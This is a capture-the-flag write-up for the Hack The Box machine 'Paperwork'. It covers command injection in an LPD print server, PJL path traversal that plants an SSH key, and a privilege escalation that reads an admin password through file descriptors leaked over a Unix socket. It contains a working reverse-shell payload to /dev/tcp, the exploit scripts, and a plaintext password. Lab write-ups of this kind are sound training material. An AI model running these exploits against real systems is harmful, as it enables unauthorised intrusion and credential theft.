# Paperwork Linux Easy HTB Machine Writeup

## NMAP Emuneration
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.28.0 (Ubuntu)
|_http-server-header: nginx/1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web Emuneration
On home page, downloaded a archive file:
```python
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                
                decoded_content = content.decode(errors='ignore')
                
                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break
                
                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
                self.sock.send(b'\x00') 
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```
The script suggested that LpdServer is running in port `1515`:
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sV -p1515 paperwork.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-13 17:22 +0700
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for paperwork.htb (10.129.248.117)
Host is up (0.20s latency).

PORT     STATE SERVICE        VERSION
1515/tcp open  ifor-protocol?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.98%I=7%D=7/13%Time=6A54BC80%P=aarch64-unknown-linux-gn
SF:u%r(TerminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20an
SF:d\x20printing\.\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
```
## `1515` port expoitation
```python
import socket

HOST = "paperwork.htb"
PORT = 1515

s = socket.create_connection((HOST, PORT))

# Receive printer job
s.sendall(b"\x02archive_intake\n")
print(s.recv(1))      # should be b'\x00'

payload = b"J';bash -c \"bash -i >& /dev/tcp/10.10.15.106/4444 0>&1\";#\n"

header = b"\x02%d cfA001\n" % len(payload)

s.sendall(header)
print(s.recv(1))      # ACK

s.sendall(payload)
print(s.recv(1))      # ACK

s.close()
```
Got reverse shell:
```bash
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)
lp@paperwork:/opt/LPDServer$ 
```
## Get user flag
Using the same method with port `9000` in the machine:
```bash
cat > /tmp/write_key.py << 'EOF'
import socket, time

pubkey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOmSm27cpdx+da0G0ATDAELvD//V6sYvqGRdgUpzoDHf jameskaois@kali"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))
cmd = f'@PJL FSDOWNLOAD NAME="../../../../home/archivist/.ssh/authorized_keys" SIZE={len(pubkey)}\n{pubkey}\n'
s.send(cmd.encode())
time.sleep(1)
try:
    print(s.recv(4096).decode(errors="ignore"))
except:
    pass
s.close()
EOF
```
```bash
lp@paperwork:/tmp$ python3 ./write_key.py 
OK
```
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/paperwork]
└─$ ssh archivist@paperwork.htb

archivist@paperwork:~$ ls
printer  user.txt
archivist@paperwork:~$ cat user.txt
81aea0018606a75205d15ae30aecae5b
```
## Privilege Escalation
```bash
archivist@paperwork:~$ ps aux | grep "paperwork"
root        1494  0.0  0.4  28432 17980 ?        Ss   09:53   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
archivi+    6710  0.0  0.0   6864  2448 pts/1    S+   11:02   0:00 grep --color=auto paperwork
archivist@paperwork:~$ cat /usr/bin/paperwork-daemon
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")


        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000) 
    s.listen(5)

    while True:
        conn, _ = s.accept()
        
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
            
        conn.close()

if __name__ == "__main__":
    main()
archivist@paperwork:~$ 
```
We have to read the admin password:
```python
#!/usr/bin/env python3
import socket
import os
import array

SOCKET_PATH = "/run/paperwork/mgmt.sock"

def extract_leaked_fd():
    if not os.path.exists(SOCKET_PATH):
        print(f"[-] Socket not found at {SOCKET_PATH}. Is the service running?")
        return

    # 1. Create a Unix Domain Socket connection
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        s.connect(SOCKET_PATH)
        print("[+] Connected to management socket.")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    # 2. Prepare buffers to receive the message and the control data (ancillary data)
    msg_buffer = 1024
    # SCM_RIGHTS sends integers (fds), calculate buffer space for 2 file descriptors
    cmsg_buffer = socket.CMSG_LEN(array.array("i").itemsize * 2)

    print("[*] Waiting for security alert and file descriptors...")
    # recvmsg returns: (data, ancdata, flags, address)
    msg, ancdata, flags, addr = s.recvmsg(msg_buffer, cmsg_buffer)

    print(f"[+] Daemon Response: {msg.decode(errors='ignore').strip()}")

    # 3. Parse the ancillary data to grab the file descriptors
    fds = []
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
            # Reconstruct the array of integer file descriptors
            fds = array.array("i")
            fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
            fds = list(fds)

    if not fds:
        print("[-] Failed to catch any leaked file descriptors. Ensure the log file contains malice keywords!")
        s.close()
        return

    print(f"[+] Intercepted File Descriptors: {fds}")
    
    # According to the daemon code: array("i", [log_fd, admin_fd])
    # The second file descriptor index [1] is /etc/paperwork/admin_pins.conf
    if len(fds) >= 2:
        admin_fd = fds[1]
        print(r"[*] Reading content directly from intercepted /etc/paperwork/admin_pins.conf...")
        
        # Read from the file descriptor using os.read
        try:
            secret_data = os.read(admin_fd, 1024).decode().strip()
            print("\n================ STEALED CREDENTIALS ================")
            print(secret_data)
            print("=====================================================\n")
        except Exception as e:
            print(f"[-] Error reading from file descriptor: {e}")
    else:
        print("[-] Did not receive enough file descriptors. Check daemon structure.")

    s.close()

if __name__ == "__main__":
    extract_leaked_fd()
```
## Get root flag
```bash
archivist@paperwork:/tmp$ wget http://10.10.15.106/root.py
--2026-07-13 11:06:48--  http://10.10.15.106/root.py
Connecting to 10.10.15.106:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2599 (2.5K) [text/x-python]
Saving to: ‘root.py’

root.py                          100%[=========================================================>]   2.54K  --.-KB/s    in 0.001s  

2026-07-13 11:06:48 (1.96 MB/s) - ‘root.py’ saved [2599/2599]

archivist@paperwork:/tmp$ which python3
/usr/bin/python3
archivist@paperwork:/tmp$ python3 ./root.py 
[+] Connected to management socket.
[*] Waiting for security alert and file descriptors...
[+] Daemon Response: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
[+] Intercepted File Descriptors: [4, 5]
[*] Reading content directly from intercepted /etc/paperwork/admin_pins.conf...

================ STEALED CREDENTIALS ================
ADMIN_PASSWORD=ApparelMortuaryCedar22
=====================================================
```
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ssh root@paperwork.htb                                     
root@paperwork.htb's password: 
Last login: Tue Jul  7 13:54:13 UTC 2026 from 10.10.14.84 on ssh
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Mon Jul 13 11:07:26 2026 from 10.10.15.106
root@paperwork:~# cat /root/root.txt
65fa6c3928f64dc9a60b30958efacd15
root@paperwork:~# 
```